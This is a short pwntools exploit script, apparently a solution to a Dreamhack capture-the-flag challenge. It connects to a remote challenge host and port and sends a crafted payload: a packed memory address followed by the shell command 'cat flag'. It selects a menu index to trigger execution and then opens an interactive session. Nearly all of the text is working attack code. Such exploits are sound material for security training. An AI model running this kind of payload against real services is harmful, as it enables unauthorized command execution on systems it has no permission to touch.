from pwn import *

hosts = 'host1.dreamhack.games'
port = 23261

p = remote(hosts,port)

name_addr = 0x804a0ac

payload = p32(name_addr+0x4)
payload += b'cat flag'

index = '19'

p.recvuntil('Admin name: ')
p.sendline(payload)
p.recvuntil('What do you want?: ')
p.sendline(index)


p.interactive()
